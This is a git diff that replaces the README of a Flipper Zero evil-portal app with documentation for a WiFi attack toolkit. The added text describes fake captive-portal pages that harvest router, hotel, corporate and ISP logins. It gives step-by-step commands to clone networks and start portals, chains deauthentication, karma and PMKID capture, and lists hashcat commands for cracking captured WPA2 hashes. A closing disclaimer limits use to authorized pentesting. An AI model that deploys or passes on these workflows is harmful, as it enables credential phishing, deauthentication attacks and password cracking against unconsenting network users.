@@ -1,208 +1,253 @@
-<p>
-  <h1 align="center"><b><a href='https://rogue-master.net'><img src="https://rogue-master.net/img/rmlogo.png" width="40%"></a></b></h1>
-</p>
-<h1 align="center"><a href='https://discord.gg/gF2bBUzAFe' target='_blank'><img src='https://rogue-master.net/img/Discord.png' alt='Discord' title='Discord'></a>
-&nbsp;<a href='https://github.com/RogueMaster/flipperzero-firmware-wPlugins/releases/latest' target='_blank'><img src='https://rogue-master.net/img/Github.png' alt='Firmware GitHub' title='Firmware GitHub'></a>
-&nbsp;<a href='https://www.patreon.com/RogueMaster?filters[tag]=Latest%20Release' target='_blank'><img src='https://rogue-master.net/img/Patreon.png' alt='Latest PATREON Release' title='Latest PATREON Release'></a>
-&nbsp;<a href='https://shop.rogue-master.net/' target='_blank'><img src='https://rogue-master.net/img/Merch.png' alt='RM Merch'' title='RM Merch'></a>
-&nbsp;<a href='https://github.com/RogueMaster/awesome-flipperzero-withModules' target='_blank'><img src='https://rogue-master.net/img/Resources.png' alt='More Research / Assets' title='More Research / Assets'></a></h1>
-
-# [Support Me On Patreon to get the best assets updated frequently!](https://www.patreon.com/RogueMaster)
-## [This repo is an improved fork of the OG Evil Portal app by bigbrodude6119!](https://github.com/bigbrodude6119/flipper-zero-evil-portal)
-- I have made some changes to file names and accepted some PRs that were open.
-- Also gave it a more descriptive application.fam file.
-- [Fixed to compile on 0.94.1 (By RogueMaster)](https://github.com/RogueMaster/flipperzero-evil-portal/commit/85df877fc6841db1d67adf3d0d4e822412da468f)
-- [Fixed to compile on OFW + Unleashed (By RogueMaster)](https://github.com/RogueMaster/flipperzero-evil-portal/commit/7a01dc9e88f9979a432b43fb742b4fe849c6357b)
-
-# Flipper Zero Evil Portal
-
-An evil captive portal Wi-Fi access point using the Flipper Zero and Wi-Fi dev board
-
-## About
-
-**This project is a work in progress.**
-
-This project will turn your Wi-Fi dev board into an open access point. When users try to connect to this access point they will be served a fake login screen. User credentials are sent to the Flipper and logged on the SD card.
-
-## Disclaimer
-
-I am not a C developer and I am using this project as a way to learn more about esp32, flipper zero and, C programming.
-
-This program is for educational purposes only.
-
-## Getting Started
-
-You will need to manually flash the Wi-Fi dev board.
-
-### Install pre-built app on the flipper
-
-Go to the releases section on this repo and download and extract either the `ofw-evil_portal.fap.zip` file or the `unleashed-evil_portal.fap.zip` file depending on if you are using the official firmware (ofw) or the unleashed firmware. These files will contain the `evil_portal.fap` file for your firmware.
-
-You will also need to download and extract the `evil_portal_sd_folder.zip` folder. This will contain necessary files for the app to run.
-
-Put the `evil_portal.fap` file into the `apps/GPIO/` folder on your Flipper SD card.
-
-Put the `evil_portal` folder into the `apps_data` folder.
-This is an example of your Flipper SD card if done correctly.
+# Evil Portal
 
 ```
-apps/
-  GPIO/
-    evil_portal.fap
-apps_data/
-  evil_portal/
-    ap.config.txt
-    index.html
-    logs/
-      <empty>
+ _____     _ _  ____            _        _
+| ____|_ _(_) ||  _ \ ___  _ __| |_ __ _| |
+|  _| \ V / | || |_) / _ \| '__| __/ _` | |
+| |___ \ /| | ||  __/ (_) | |  | || (_| | |
+|_____/_/ |_|_||_|   \___/|_|   \__\__,_|_|
 ```
 
-You should be able to see the `[ESP32] Evil Portal` app on your flipper zero now.
+**Captive portal toolkit for WiFi Marauder on ESP32 + Flipper Zero**
 
-If you want to create your own `index.html` file keep in mind that there is a limit of 4000 characters for the file. I plan to increase this later but I ran into some issues with larger files.
+> **For authorized security testing, WiFi pentesting engagements, and educational use only.**
+> Deploying fake portals against users you do not have written permission to test is illegal.
 
-## Installing/flashing the Wi-Fi dev board
+---
 
-If you've already flashed your Wi-Fi dev board with the Marauder firmware or something else you will need to erase it before installing the new firmware here. Follow [the guide here](#erasing-firmware) for that.
+## What Is This?
 
-Follow the steps below to flash the Wi-Fi dev board with the evil portal firmware via Windows. The instructions below are for the Flipper Zero Wi-Fi Wrover Development Module (**ESP32-S2**), you may have to adjust the steps for your specific board:
+Evil Portal is a feature in [WiFi Marauder](https://github.com/justcallmekoko/ESP32Marauder) firmware that runs a rogue access point with a DNS spoofing server and HTTP captive portal on the ESP32. When a victim device connects, all DNS queries resolve to `172.0.0.1`, where Marauder serves your chosen HTML page and logs any form submissions to the SD card.
 
-1. Download and install the Arduino IDE from [here][link-arduino].
-2. Download zip/clone dependency [AsyncTCP][link-asynctcp] to file.
-3. Download zip/clone dependency [ESPAsyncWebServer][link-espasyncwebserver] to file.
-4. Unzip both dependencies to your Arduino library folder.
-   - On Windows this is usually `C:\Users\<username>\Documents\Arduino\libraries`.
-5. Go to the releases section on this repo and download the `EvilPortal.ino` file, open it with Arduino IDE.
-6. Go to `File > Preferences` and paste the following two URL's into the `Additional Boards Manager URLs` field:
-   ```
-   https://dl.espressif.com/dl/package_esp32_index.json
-   https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_dev_index.json
-   ```
-7. Go to `Tools > Board > Boards Manager...` and search for `esp32` and install `esp32 by Espressif Systems`.
-8. Go to `Tools > Board` and select `ESP32S2 Dev Module`.
-9. On your ESP32-S2 Wi-Fi module, hold the BOOT button.
-10. Connect your ESP32-S2 to your computer, keep holding the BOOT button (holding for just 3-5 seconds and releasing may be fine, continuously holding worked better for me).
-11. Go to `Tools > Port` and select the port that appeared when you connected your ESP32-S2.
-12. Click the "Upload" button in the top left corner of the Arduino IDE.
-13. On success, you will see:
-    ```
-    Hash of data verified.
-    Leaving...
-    WARNING: ESP32-S2 (revision v0.0) chip was placed into download mode...
-    ```
-14. Plug in the Wi-Fi Dev board to the flipper, press the reset button on the Wi-Fi dev board and you should now see a solid blue light.
+This directory contains:
 
-## Installing/flashing an ESP32 Wroom board
+| Path | Contents |
+|---|---|
+| `portals/` | 9 ready-to-deploy HTML captive portal pages |
+| `marauder_scripts/fpwn/` | Novel `.fpwn` modules for FlipperPwn (multi-phase WiFi attack chains) |
+| `marauder_scripts/serial_tools/` | Python utilities for PC-side serial control and PCAP capture |
 
-Reddit user dellycem [compiled binaries](https://old.reddit.com/r/flipperzero/comments/14ni93r/i_made_a_evil_portal_app_for_the_fz_wifi_dev_board/jqd42fi/?context=3) for the ESP32 Wroom board if you would like to use that instead of the Wi-Fi devboard.
+---
 
-1. Download the bin files from [this link](https://wetransfer.com/downloads/4d3dd914f2df43dc6c84efa452043f4220230702094742/33a478)
-2. Go to [ESPWebTool](https://esp.huhn.me/) and get your board connected.
-3. Add each of the bin files at the following locations
-   ```
-   EvilPortal.bootloader.bin - 0x1000
-   EvilPortal.partitions.bin - 0x8000
-   boot_app0.bin - 0xe000
-   EvilPortal.bin - 0x10000
-   ```
-4. Press the program button and wait while your board is flashed.
-5. Once complete, hook up the 3.3v, GND, RX0, and TX0 pins to the flipper zero. Remember that the RX/TX pins should go to the opposite pins on the flipper zero. RX -> TX, TX -> RX.
+## Portal Pages
 
-## Usage
+### Common Scenarios
 
-Plug in the Wi-Fi Dev board to the flipper.
+| File | Scenario | Captures |
+|---|---|---|
+| `router_generic.html` | Router admin session expiry | Username + password |
+| `hotel_wifi.html` | Hotel guest WiFi with loyalty login | Last name, room, email, password |
+| `coffee_shop.html` | Free coffee shop WiFi email opt-in | Name + email |
+| `corporate_guest.html` | Enterprise guest network authentication | Email, access code, host name |
+| `airport_wifi.html` | Airport free WiFi identity verification | Email or phone + flight number |
 
-Open the app on the Flipper and press `Start portal` on the main menu. After a few seconds you should start to see logs coming in from your Wi-Fi dev board and the AP will start and the LED will turn green.
+### Unique / Novel Scenarios
 
-The AP will take the name that is in the `ap.config.txt` file located on your Flipper in the `apps_data/evil_portal/` folder.
+| File | Scenario | Why It Works |
+|---|---|---|
+| `isp_maintenance.html` | ISP account verification during "outage" | Urgency + account number + password combo |
+| `smart_home_setup.html` | Smart home hub WiFi provisioning | Victims expect to enter WiFi credentials here |
+| `emergency_portal.html` | Security incident identity verification | High-urgency social engineering for corporate targets |
 
-When you connect to the AP a web page will open after a few seconds. This web page contains the HTML located in the `index.html` file located on your Flipper in the `apps_data/evil_portal/` folder.
+### Trekistry Branded
 
-You can stop the portal by pressing `Stop portal` on the main menu. The LED should turn blue.
+| File | Purpose |
+|---|---|
+| `trekistry_escape.html` | Safety-awareness page: warns victim they connected to an unofficial AP, promotes Trekistry as a travel platform. No credential capture — redirect/awareness use. |
 
-You can manually save logs using the `Save logs` command. Logs will be stored in the `logs` folder that is in your `apps_data/evil_portal/` folder.
+---
 
-Logs will automatically be saved when exiting the app or when the current log reaches 4000 characters.
+## Deploying a Portal (Marauder CLI)
 
-## Building for different firmware
+**Step 1 — Copy your HTML to the ESP32 SD card:**
+```
+SD card root:
+  /portals/
+    hotel_wifi.html
+    corporate_guest.html
+    ...
+```
 
-If you are not using the official flipper zero firmware or the unleashed firmware you can build the .fap file yourself by following [these instructions](https://github.com/flipperdevices/flipperzero-firmware/blob/dev/documentation/AppsOnSDCard.md).
+**Step 2 — Scan for APs and pick your target:**
+```
+scanap
+```
 
-Note that you will need to use the firmware repo that you wish to build for.
+**Step 3 — Set the HTML page:**
+```
+evilportal -c sethtml hotel_wifi.html
+```
 
-You can also download builds for each firmware via [flipc](https://flipc.org/bigbrodude6119/flipper-zero-evil-portal?branch=main&root=flipper%2Fflipper-evil-portal).
+**Step 4 — Optionally clone a specific AP's SSID:**
+```
+evilportal -c setap 2
+```
+(where `2` is the AP index from `scanap`)
 
-## Erasing firmware <a name="erasing-firmware"></a>
+**Step 5 — Start the portal:**
+```
+evilportal -c start
+```
 
-Assuming you have the Flipper Zero Wi-Fi Wrover Development Module (**ESP32-S2**):
+**Step 6 — Monitor captures:**
+Credentials appear on the Flipper display in real time and are logged to:
+```
+/logs/evil_portal.log
+```
 
-1. Install [Python][link-python].
-2. Open a command terminal as an administrator:
-   - On Windows press ⊞Win+R, type "cmd", and press CTRL+SHIFT+ENTER.
-3. In the terminal type the following to install [esptool][link-esptool] via Python package manager:
-   ```
-   pip install esptool
-   ```
-4. Install [setuptools][link-setuptools] dependencies:
-   ```
-   pip install setuptools
-   ```
-5. Enter the following command into your terminal, do not run it yet:
-   ```
-   python -m esptool --chip esp32s2 erase_flash
-   ```
-6. On your ESP32-S2 Wi-Fi module, hold the BOOT button.
-7. Connect your ESP32-S2 to your computer, keep holding the BOOT button.
-8. In your terminal press enter to run the command from step 5.
-9. When successful you will get the message `Chip erase completed successfully in ___s` (time in seconds suffixed with "s").
-10. Unplug/reset your board.
+**Step 7 — Stop:**
+```
+stopscan
+```
 
-## Issues
+---
 
-If you run into any issues make sure that you have the required files set up on the Flipper `apps_data` folder on the Flipper SD card.
+## FlipperPwn Modules (`.fpwn`)
 
-Logs will not be saved if there is no `logs` folder in `apps_data/evil_portal/`.
+These modules require [FlipperPwn](../flipperpwn/) and an ESP32 WiFi Dev Board.
+Copy them to your Flipper SD card under `/ext/flipperpwn/modules/credential/`.
 
-If the AP won't start or you have other issues try pressing reset on the Wi-Fi dev board, waiting a few seconds, and pressing `Start portal` on the main menu.
+| File | Description |
+|---|---|
+| `evil_twin.fpwn` | Scan → deauth target AP clients → deploy evil portal with cloned SSID |
+| `probe_karma_portal.fpwn` | Sniff probe requests → identify top-probed SSID → targeted karma + portal |
+| `pmkid_harvest.fpwn` | Dual-vector: PMKID hash capture + parallel evil portal (hash + cleartext) |
+| `wifi_survey_report.fpwn` | Full WiFi recon survey auto-typed as formatted report via USB HID |
+| `ble_chaos.fpwn` | Sequential BLE attack coverage: iOS / SwiftPair / Samsung / AirTag |
 
-It is important to give the devboard some time to load the html files from the Flipper.
+### What Makes These Novel
 
-If you have the Marauder firmware on your dev board you may need to enable `Erase All Flash Before Sketch Upload` before flashing.
+Most public Marauder attack chains do one thing at a time. These modules chain multiple phases:
 
-Some users are reporting that the captive portal login does not open on some Android phones.
+- **`probe_karma_portal`** — First passively identifies what SSIDs devices *want* to connect to, then targets only the highest-demand one. More stealthy and targeted than broad karma attacks.
 
-## Todo
+- **`pmkid_harvest`** — Runs PMKID capture (offline-crackable WPA2 hash) and evil portal (direct cleartext) simultaneously. Whichever vector succeeds first wins.
 
-I plan on working on this in my free time. Here is my todo list.
+- **`wifi_survey_report`** — Turns Flipper Zero into an automated wireless survey tool that types a formatted pentest report directly into any text editor via USB HID. No software installation on target required.
 
-- Support for multiple portals
-- Enter AP name on the Flipper
-- Add a config file for general app settings
-- Create cleaner log files that are easier to read
-- Clean up code & implement best practices
+---
 
-## License
+## Python Serial Tools
 
-Distributed under the MIT License. See `LICENSE.txt` for more information.
+Located in `marauder_scripts/serial_tools/`. Require `pip install pyserial`.
 
-## Acknowledgments
+### `marauder_serial.py` — Interactive Marauder Shell
 
-I was only able to create this using the following apps as examples
+```bash
+python3 marauder_serial.py [PORT] [BAUD]
+python3 marauder_serial.py /dev/ttyUSB0
+python3 marauder_serial.py COM3 115200
+```
 
-- [flipperzero-wifi-marauder](https://github.com/0xchocolate/flipperzero-wifi-marauder)
-- [UART_Terminal](https://github.com/cool4uma/UART_Terminal)
-- [flipper-zero-fap-boilerplate](https://github.com/leedave/flipper-zero-fap-boilerplate)
-- [Create Captive Portal Using ESP32](https://iotespresso.com/create-captive-portal-using-esp32/)
+Features:
+- Auto-detects Flipper/ESP32 serial port
+- Command history with readline
+- Automatic PCAP frame extraction (saves `[BUF/BEGIN]..[BUF/CLOSE]` blocks as `.pcap` files)
+- Built-in **macros** for common attack sequences:
 
-## Contact me
+| Macro | What It Does |
+|---|---|
+| `!macro quick_scan` | AP scan + station scan + list results |
+| `!macro pmkid_force` | PMKID capture with forced deauth on ch 6 (60s) |
+| `!macro deauth_flood` | Scan + select first AP + deauth flood |
+| `!macro beacon_spam_random` | Random beacon spam |
+| `!macro recon` | AP scan + probe sniff + beacon sniff |
+| `!macro ble_full` | Full BLE attack sequence (scan → sourapple → swiftpair → samsung → airtag) |
 
-You can message me on my reddit account bigbrodude6119
+```
+marauder> !macros             # list macros
+marauder> !macro recon        # run recon macro
+marauder> scanap              # direct command
+marauder> !pcap               # show saved PCAP files
+marauder> !help               # full help
+```
 
-<!-- LINKS -->
+### `pcap_capture.py` — Dedicated PCAP Capture
 
-[link-arduino]: https://www.arduino.cc/en/software
-[link-asynctcp]: https://github.com/me-no-dev/AsyncTCP
-[link-espasyncwebserver]: https://github.com/me-no-dev/ESPAsyncWebServer
-[link-esptool]: https://pypi.org/project/esptool/
-[link-python]: https://www.python.org/downloads/
-[link-setuptools]: https://pypi.org/project/setuptools/
+```bash
+python3 pcap_capture.py --mode sniffraw --duration 60 --out ./captures
+python3 pcap_capture.py --mode sniffpmkid --channel 6 --deauth --duration 120
+python3 pcap_capture.py --mode sniffbeacon
+```
+
+Features:
+- Handles `[BUF/BEGIN]`/`[BUF/CLOSE]` binary framing
+- Writes valid libpcap files (readable by Wireshark, tshark, Scapy)
+- Live progress bar with frame counter
+- Multiple captures in one session → separate timestamped `.pcap` files
+- Graceful `Ctrl+C` shutdown with partial capture flush
+
+```
+Modes:
+  sniffraw       All 802.11 frames
+  sniffbeacon    Beacon frames
+  sniffdeauth    Deauthentication frames
+  sniffpmkid     PMKID/EAPOL handshake (use --deauth to force handshakes)
+  sniffprobe     Probe requests
+```
+
+**Process captured PMKID hashes:**
+```bash
+# Convert to hashcat format
+hcxpcapngtool -o hash.hc22000 capture_20260302_091400_001.pcap
+
+# Crack with hashcat (dictionary)
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+
+# Crack with hashcat (rules)
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r best64.rule
+```
+
+---
+
+## Hardware Setup
+
+```
+Flipper Zero GPIO header
+│
+├── Pin 13 (TX) ──────────────► ESP32 RX0
+├── Pin 14 (RX) ◄────────────── ESP32 TX0
+├── Pin 9 (3.3V) ─────────────► ESP32 3.3V
+└── Pin 8/11/18 (GND) ────────► ESP32 GND
+```
+
+The **official Flipper Zero WiFi Dev Board** plugs directly into the GPIO header with no wiring.
+Third-party ESP32 boards require the connections above.
+
+Flash WiFi Marauder: https://github.com/justcallmekoko/ESP32Marauder
+
+---
+
+## SD Card Layout
+
+**ESP32 SD card:**
+```
+/
+├── portals/
+│   ├── hotel_wifi.html
+│   ├── corporate_guest.html
+│   └── ...
+└── logs/
+    ├── evil_portal.log
+    ├── pmkid_20260302.pcap
+    └── probes.log
+```
+
+**Flipper SD card (for FlipperPwn modules):**
+```
+/ext/flipperpwn/modules/credential/
+├── evil_twin.fpwn
+├── probe_karma_portal.fpwn
+├── pmkid_harvest.fpwn
+└── ...
+```
+
+---
+
+## Legal Disclaimer
+
+This toolkit is provided for **authorized security testing, WiFi pentesting engagements, and educational research only.**
+
+- Do not deploy portals against networks or users you do not own or have explicit written permission to test
+- Unauthorized interception of network credentials is a federal crime under the CFAA and equivalent laws worldwide
+- The authors accept no liability for misuse
